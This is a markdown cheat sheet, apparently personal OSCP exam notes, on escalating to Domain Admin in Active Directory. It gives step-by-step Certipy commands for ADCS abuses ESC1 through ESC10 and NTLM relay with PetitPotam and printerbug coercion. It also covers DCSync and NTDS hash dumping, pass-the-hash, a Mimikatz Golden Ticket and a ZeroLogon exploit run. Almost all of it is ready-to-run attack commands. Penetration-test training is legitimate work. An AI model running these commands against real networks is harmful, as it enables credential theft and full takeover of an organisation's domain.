[AD adcs-attacks md 36f15bd2d16c81048dabd489c3cfd21b.md](https://github.com/user-attachments/files/28387619/AD.adcs-attacks.md.36f15bd2d16c81048dabd489c3cfd21b.md)

# AD/adcs-attacks.md

# Escalation to Domain Admin

---

## ADCS Attacks (Certipy) — ESC1 to ESC10

### Key concepts

| Term | What it is |
| --- | --- |
| **CA** | Server that issues certificates. Usually called `DOMAIN-CA` or `DC01-CA` |
| **Certificate Template** | Template that defines what certificates are issued and who can request them. This is where the bugs are |
| **EKU** | Extended Key Usage. `Client Authentication` is what we want to authenticate as another user |
| **SAN** | Subject Alternative Name. If the attacker can control it → they can request a certificate as Administrator |
| **Enrollee Supplies Subject** | Flag that lets the requester freely define the SAN. Core of ESC1 |
| **Web Enrollment** | HTTP/HTTPS interface on the CA to request certificates. Vulnerable to NTLM relay (ESC8) |

### ADCS Enumeration — always the first step

```bash
# Detect if ADCS is present
nxc ldap <DC_IP> -u <user> -p '<pass>' -M adcs

# Full enumeration with Certipy
certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <DC_IP>
certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <DC_IP> -vulnerable -stdout   # vuln only
certipy find -u '<user>@<domain>' -hashes ':<NTHash>' -dc-ip <DC_IP> -vulnerable -stdout

# From Windows
.\Certify.exe find /vulnerable
```

### Post-certificate flow: from .pfx to Domain Admin

This flow is common to almost all ESCs:

```bash
# Authenticate with the certificate → gets TGT + NT Hash
certipy auth -pfx '<file.pfx>' -dc-ip <DC_IP>
# Output: administrator.ccache + NT hash of the target user

# Option A: PTT
export KRB5CCNAME=administrator.ccache
nxc smb <DC_IP> -u Administrator -p '' --use-kcache
impacket-secretsdump -k -no-pass '<domain>/Administrator'@<DC_FQDN>

# Option B: PTH
nxc smb <DC_IP> -u Administrator -H '<NTHash>'
evil-winrm -i <DC_IP> -u Administrator -H '<NTHash>'
```

---

### ESC1 — Enrollee Supplies Subject (most common)

**Conditions:** `Enrollee Supplies Subject: True` + `Client Authentication: True` + `Enrollment Rights: Domain Users`

```bash
# 1. Find the vulnerable template
certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <DC_IP> -vulnerable -stdout
# Note: Template Name and Certificate Authorities

# 2. Request a certificate as Administrator
certipy req -u '<user>@<domain>' -p '<pass>' \
  -dc-ip <DC_IP> -target '<CA_FQDN>' -ca '<CA_NAME>' \
  -template '<TEMPLATE_NAME>' -upn 'administrator@<domain>'
# Output: administrator.pfx

# 3. Authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>

# 4. DA
nxc smb <DC_IP> -u Administrator -H '<NTHash>' --ntds
```

---

### ESC2 — Any Purpose EKU or no EKU

The template has `Any Purpose` EKU or no EKU at all → can be used for anything. Exploitation identical to ESC1 if it has `Enrollee Supplies Subject`.

```bash
certipy req -u '<user>@<domain>' -p '<pass>' -dc-ip <DC_IP> \
  -target '<CA_FQDN>' -ca '<CA_NAME>' -template '<TEMPLATE_NAME>' \
  -upn 'administrator@<domain>'
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

### ESC3 — Enrollment Agent

Two templates: Template A has `Certificate Request Agent` EKU (lets you request on behalf of others). Template B has Client Authentication. With A you request certificates as any user via B.

```bash
# Step 1: request Enrollment Agent certificate (Template A)
certipy req -u '<user>@<domain>' -p '<pass>' -dc-ip <DC_IP> \
  -target '<CA_FQDN>' -ca '<CA_NAME>' -template '<AGENT_TEMPLATE>'

# Step 2: use the agent to request as Administrator (Template B)
certipy req -u '<user>@<domain>' -p '<pass>' -dc-ip <DC_IP> \
  -target '<CA_FQDN>' -ca '<CA_NAME>' -template '<AUTH_TEMPLATE>' \
  -on-behalf-of '<domain>\Administrator' -pfx '<user>.pfx'

# Step 3: authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

### ESC4 — Write Privileges on a Template

You have write access on a template (GenericAll, GenericWrite, WriteProperty, WriteDacl) → reconfigure it to make it vulnerable to ESC1.

```bash
# Step 1: find the template with write access
certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <DC_IP> -vulnerable -stdout
# Look for: [ESC4]

# Step 2: reconfigure template (saves original config)
certipy template -u '<user>@<domain>' -p '<pass>' \
  -template '<TEMPLATE_NAME>' -save-old -dc-ip <DC_IP>
# Certipy v5.x:
certipy template -u '<user>@<domain>' -p '<pass>' \
  -template '<TEMPLATE_NAME>' -write-default-configuration -dc-ip <DC_IP>

# Step 3: now the template is ESC1
certipy req -u '<user>@<domain>' -p '<pass>' -dc-ip <DC_IP> \
  -target '<CA_FQDN>' -ca '<CA_NAME>' -template '<TEMPLATE_NAME>' \
  -upn 'administrator@<domain>'

# Step 4: authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>

# IMPORTANT: restore the original template after (OSCP exam)
certipy template -u '<user>@<domain>' -p '<pass>' \
  -template '<TEMPLATE_NAME>' -configuration '<TEMPLATE_NAME>.json' -dc-ip <DC_IP>
```

> **OSCP tip:** Always restore the template with `-configuration` after ESC4. In shared environments modifying templates without cleaning up affects other candidates.
> 

---

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

The CA has this flag enabled → allows arbitrary SAN on **any** template, even without `Enrollee Supplies Subject`. How to detect it in Certipy: `[!] CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set`

```bash
# Same flow as ESC1 but on any template with Client Auth
certipy req -u '<user>@<domain>' -p '<pass>' -dc-ip <DC_IP> \
  -target '<CA_FQDN>' -ca '<CA_NAME>' -template 'User' \
  -upn 'administrator@<domain>'
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

### ESC7 — Manage CA / Manage Certificates

You have `Manage CA` or `Manage Certificates` rights on the CA → you can add yourself as an officer and approve pending requests for the `SubCA` template.

```bash
# Step 1: add yourself as officer
certipy ca -u '<user>@<domain>' -p '<pass>' -ca '<CA_NAME>' -add-officer '<user>' -dc-ip <DC_IP>

# Step 2: enable SubCA template
certipy ca -u '<user>@<domain>' -p '<pass>' -ca '<CA_NAME>' -enable-template SubCA -dc-ip <DC_IP>

# Step 3: request certificate (will be denied but stays pending)
certipy req -u '<user>@<domain>' -p '<pass>' -dc-ip <DC_IP> \
  -target '<CA_FQDN>' -ca '<CA_NAME>' -template SubCA \
  -upn 'administrator@<domain>'
# Note the Request ID

# Step 4: approve the pending request
certipy ca -u '<user>@<domain>' -p '<pass>' -ca '<CA_NAME>' -issue-request <ID> -dc-ip <DC_IP>

# Step 5: retrieve the approved certificate
certipy req -u '<user>@<domain>' -p '<pass>' -ca '<CA_NAME>' -retrieve <ID> -dc-ip <DC_IP>

# Step 6: authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

### ESC8 — NTLM Relay to Web Enrollment

**Conditions:** Web Enrollment enabled (`/certsrv/`) + you can coerce authentication from the DC.

```bash
# Step 1: verify Web Enrollment
certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <DC_IP> -vulnerable -stdout
# Look for: Web Enrollment: Enabled and [ESC8]

# Step 2: set up relay — Certipy listens and redirects to the CA
certipy relay -ca '<CA_IP>' -template DomainController

# Step 3: in another terminal — coerce authentication from the DC
# Option A: PetitPotam
python3 PetitPotam.py -u '<user>' -p '<pass>' <YOUR_IP> <DC_IP>

# Option B: PrinterBug
python3 printerbug.py '<domain>/<user>:<pass>' <YOUR_IP> <DC_FQDN>

# Option C: DFSCoerce
python3 dfscoerce.py -u '<user>' -p '<pass>' <YOUR_IP> <DC_IP>

# Result: dc01.pfx (certificate of the DC's machine account)

# Step 4: authenticate as the DC
certipy auth -pfx dc01.pfx -dc-ip <DC_IP>
# User: DC01$ (machine account)

# Step 5: DCSync with the DC's machine account
impacket-secretsdump '<domain>/DC01$'@<DC_IP> -hashes ':<DC_NTHash>'
nxc smb <DC_IP> -u 'DC01$' -H '<DC_NTHash>' --ntds
```

---

### ESC9 / ESC10 — Weak Certificate Mapping

Requires `GenericWrite` on a user to modify their `userPrincipalName`. More complex, less common in current OSCP.

```bash
# ESC9: change victim's UPN to point to Administrator
certipy account update -u '<user>@<domain>' -p '<pass>' \
  -user '<victimUser>' -upn 'administrator' -dc-ip <DC_IP>

# Request certificate as the victim (cert will have UPN=administrator)
certipy req -u '<victimUser>@<domain>' -p '<victimPass>' -dc-ip <DC_IP> \
  -target '<CA_FQDN>' -ca '<CA_NAME>' -template '<TEMPLATE_ESC9>'

# Restore victim's UPN
certipy account update -u '<user>@<domain>' -p '<pass>' \
  -user '<victimUser>' -upn '<victimUser>@<domain>' -dc-ip <DC_IP>

# Authenticate with the certificate → resolves as Administrator
certipy auth -pfx administrator.pfx -domain <domain> -dc-ip <DC_IP>
```

---

### Shadow Credentials via Certipy (alternative to pywhisker)

```bash
# All in one
certipy shadow auto -u '<user>@<domain>' -p '<pass>' -account '<targetUser>' -dc-ip <DC_IP>

# Step by step
certipy shadow add    -u '<user>@<domain>' -p '<pass>' -account '<targetUser>' -dc-ip <DC_IP>
certipy shadow remove -u '<user>@<domain>' -p '<pass>' -account '<targetUser>' -dc-ip <DC_IP> -device-id '<DeviceID>'
```

---

### ESC Summary Table

| ESC | Key condition | Tool | Impact |
| --- | --- | --- | --- |
| ESC1 | Template with Enrollee Supplies Subject + Client Auth + low-priv enroll | `certipy req -upn` | Direct DA |
| ESC2 | Template with Any Purpose EKU or no EKU | `certipy req -upn` | Direct DA |
| ESC3 | Template with Certificate Request Agent EKU | `certipy req -on-behalf-of` | Direct DA |
| ESC4 | Write access on a template | `certipy template -write-default-configuration` | Turns into ESC1 |
| ESC6 | CA with EDITF_ATTRIBUTESUBJECTALTNAME2 | `certipy req -upn` on any template | Direct DA |
| ESC7 | Manage CA or Manage Certificates | `certipy ca -add-officer`  • SubCA | Direct DA |
| ESC8 | Web Enrollment + NTLM coercion possible | `certipy relay`  • PetitPotam | Direct DA |
| ESC9/10 | No security extension + GenericWrite on user | `certipy account update`  • `certipy req` | Indirect DA |

---

### ADCS Checklist for every machine

```
1. nxc ldap <DC_IP> -u user -p pass -M adcs
   → Is there a CA? → yes → continue

2. certipy find -vulnerable -stdout
   → ESC1/2/3? → exploit directly
   → ESC4?     → need write on the template (check BloodHound)
   → ESC6?     → flag on the CA, any template works
   → ESC7?     → need Manage CA or Manage Certificates
   → ESC8?     → Web Enrollment enabled + can coerce

3. certipy req → certipy auth → NT hash → PTH / DCSync
```

---

### Certipy Troubleshooting

```bash
# KDC_ERR_CLIENT_NOT_TRUSTED → sync the clock
sudo ntpdate <DC_IP>

# Certificate template not found → check the exact CA name
certipy find -vulnerable | grep 'Certificate Authorities'

# DC without PKINIT support → use PassTheCert
git clone https://github.com/AlmondOffSec/PassTheCert
python3 passthecert.py -action ldap-shell -crt dc.crt -key dc.key -domain '<domain>' -dc-ip <DC_IP>
```

---

## Golden Ticket

**Concept:** With the krbtgt hash we forge a Kerberos ticket with full access to any machine in the domain. Maximum persistence.

```powershell
# In Mimikatz
privilege::debug
lsadump::lsa /inject /name:krbtgt
# Copy: domain SID (after the /) and NTLM hash from *Primary

# Generate Golden Ticket
kerberos::golden /User:FakeAdmin /domain:<domain.local> \
  /sid:<DOMAIN_SID> /krbtgt:<NTLM_HASH> /id:500 /ptt

# Open cmd with the compromised session
misc::cmd
```

---

## LAPS — Read local admin passwords

```powershell
# Read DC local admin password
Get-ADComputer DC01 -property 'ms-mcs-admpwd'

# With CrackMapExec
crackmapexec ldap <IP> -u <user> -p '<password>' --module laps
```

---

## Certificate for evil-winrm

```bash
# Create key pair
openssl req -newkey rsa:2048 -nodes -keyout <user>.key -out <user>.csr

# Paste the .csr in the Certificate Services web → Request Certificate
# Download the .cer certificate

# Connect with evil-winrm
evil-winrm -S -k <user>.key -p <cert>.cer -i <IP> -u '<user>' -p '<password>'
```

---

## ZeroLogon (CVE-2020-1472)

> ⚠️ LAB ONLY — breaks the domain
> 

```bash
# Check
python3 zerologon_check.py <DC-NAME> <DC-IP>

# Exploit (LAB ONLY)
python3 cve-2020-1472-exploit.py <DC-NAME> <DC-IP>
secretsdump.py -just-dc <DOMAIN>/<DC-NAME>$@<IP>

# RESTORE IMMEDIATELY AFTER
secretsdump.py administrator@<IP> -hashes :<HASH>
# Copy plain_password_hex
python3 restorepassword.py <DOMAIN>/<DC-NAME>@<DC-NAME> -target-ip <IP> -hexpass <HEX>
```

---

## PrintNightmare (CVE-2021-1675)

```bash
# Check
rpcdump.py @<IP> | egrep 'MS-RPRN|MS-PAR'

# Mitigate — disable Print Spooler
Stop-Service Spooler
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Spooler" /v "Start" /t REG_DWORD /d "4" /f
```
